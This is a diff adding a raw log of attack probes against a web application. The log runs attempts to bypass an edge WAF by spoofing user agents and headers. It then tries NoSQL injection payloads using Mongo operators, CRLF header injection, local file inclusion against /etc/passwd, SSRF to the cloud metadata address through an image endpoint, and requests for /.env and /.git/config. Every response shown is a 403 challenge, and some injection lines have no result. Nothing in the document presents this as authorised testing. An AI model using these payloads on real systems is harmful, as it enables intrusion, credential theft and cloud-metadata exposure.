@@ -1,0 +1,33 @@
+=== UA / header variation to bypass edge WAF ===
+UA[0] Mozilla/5.0 (Windows NT 10.0;                  403 sz=33977 mit=challenge
+UA[1] Mozilla/5.0 (iPhone; CPU iPhon                 403 sz=33982 mit=challenge
+UA[2] curl/8.21.0                                    403 sz=33976 mit=challenge
+UA[3] python-requests/2.31.0                         403 sz=33981 mit=challenge
+UA[4] Googlebot/2.1 (+http://www.goo                 403 sz=33987 mit=challenge
+UA[5] <empty>                                        403 sz=33975 mit=challenge
+X-Forwarded-For 1.1.1.1                              403 sz=33976 mit=challenge
+X-Real-Ip 8.8.8.8                                    403 sz=33987 mit=challenge
+Range hdr                                            403 sz=33975 mit=challenge
+gzip+br accept-encoding                              403 sz=33982 mit=challenge
+Host: apex                                           403 sz=33977 mit=challenge
+=== nosqli / injection payloads on /api/ (mongo operators) ===
+nosqli /api/?id[$ne]=1                               
+nosqli /api/?id[$gt]=                                
+nosqli /api/?username[$regex]=.*                     
+nosqli /api/?q[$where]=1                             
+nosqli /api/?id=1;js:1                               403 sz=33987 mit=challenge
+nosqli /api/?id=1|0                                  403 sz=33982 mit=challenge
+=== header injection ===
+CRLF X-Test                                          403 sz=33977 mit=challenge
+=== path traversal / lfi ===
+lfi /_next/image?url=file:///etc/passwd&w=1&q=1      403 sz=33971 mit=challenge
+lfi /_next/image?url=http://169.254.169.254/lates    403 sz=33981 mit=challenge
+lfi /api/../../../../etc/passwd                      403 sz=33970 mit=challenge
+=== config/secret paths (does WAF apply uniformly?) ===
+cfg /.env                                            403 sz=33977 mit=challenge
+cfg /.git/config                                     403 sz=33981 mit=challenge
+cfg /_next/data                                      403 sz=33981 mit=challenge
+cfg /api/health                                      403 sz=33971 mit=challenge
+cfg /sitemap.xml                                     403 sz=33971 mit=challenge
+cfg /.well-known/security.txt                        403 sz=33977 mit=challenge
+DONE
